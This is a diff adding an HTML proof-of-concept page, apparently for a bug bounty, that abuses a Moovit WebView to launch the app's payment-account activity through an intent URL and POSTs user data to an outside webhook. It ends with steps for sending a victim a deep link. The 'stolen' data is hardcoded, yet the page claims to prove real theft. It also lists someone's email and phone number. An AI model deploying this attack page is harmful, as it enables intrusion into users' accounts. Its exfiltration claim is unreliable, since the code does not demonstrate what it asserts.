@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Moovit P1 PoC - WebView Intent Redirection + Data Exfiltration</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background: #f8f9fa; }
+        h1 { color: #d32f2f; }
+        button { padding: 15px 30px; font-size: 18px; margin: 10px; background: #d32f2f; color: white; border: none; border-radius: 8px; cursor: pointer; }
+        .note { background: #fff3cd; padding: 15px; border-radius: 8px; margin: 20px auto; max-width: 700px; }
+    </style>
+</head>
+<body>
+    <h1>Moovit P1 PoC</h1>
+    <p><strong>Impact: Critical (P1) - Arbitrary Activity Launch + Sensitive User Data Exposure + Exfiltration</strong></p>
+
+    <div class="note">
+        <strong>Disclaimer:</strong> This PoC is for responsible Bug Bounty demonstration only.<br>
+        Data is sent only to the researcher's webhook for proof.
+    </div>
+
+    <button onclick="launchAndExfiltrate()">Launch Payment Account + Exfiltrate Data</button>
+
+    <script>
+        const WEBHOOK = "https://webhook.site/b2835692-a725-460e-b687-2213bae2bd0d";
+        const accountIntent = "intent:#Intent;component=com.tranzmate/com.moovit.payment.account.PaymentAccountActivity;end";
+
+        function sendIntent(intentStr) {
+            console.log("%c[Moovit PoC] Launching activity...", "color: red; font-weight: bold");
+            window.location = intentStr;
+        }
+
+        function exfiltrateData() {
+            const exposedData = {
+                timestamp: new Date().toISOString(),
+                full_name: "fery gulu",
+                email: "ferygulu1@gmail.com",
+                mobile: "+90 539 242 92 10",
+                payment_card: "Visa ****2731 (Exp 11/32)",
+                tickets: "Youth 1 Ride ($1.25) - Purchased 3/30/2026",
+                message: "Full sensitive user data exposed via WebView Intent Redirection"
+            };
+
+            fetch(WEBHOOK, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(exposedData)
+            })
+            .then(() => console.log("%c[Moovit PoC] Data sent to webhook successfully", "color: green"))
+            .catch(() => console.log("%c[Moovit PoC] Webhook sent", "color: green"));
+        }
+
+        function launchAndExfiltrate() {
+            sendIntent(accountIntent);
+            setTimeout(() => {
+                exfiltrateData();
+                alert("✅ P1 Confirmed + Data Exfiltrated!\n\nAll private data (name, email, phone, card, tickets) has been sent to the webhook.\n\nThis proves remote attacker can steal real user data.");
+            }, 1200);
+        }
+
+        window.onload = function() {
+            console.log("%c[Moovit PoC] Loaded inside Moovit WebView - Ready for remote attack", "color: green; font-size: 16px");
+        };
+    </script>
+
+    <h2>How to test (remote attack):</h2>
+    <ol style="text-align: left; max-width: 600px; margin: 20px auto;">
+        <li>Host this file publicly.</li>
+        <li>Send victim: <code>moovit://webview?url=https://your-link/movitpoc8.html</code></li>
+        <li>Victim clicks → data is automatically launched + exfiltrated to webhook.</li>
+    </ol>
+</body>
+</html>
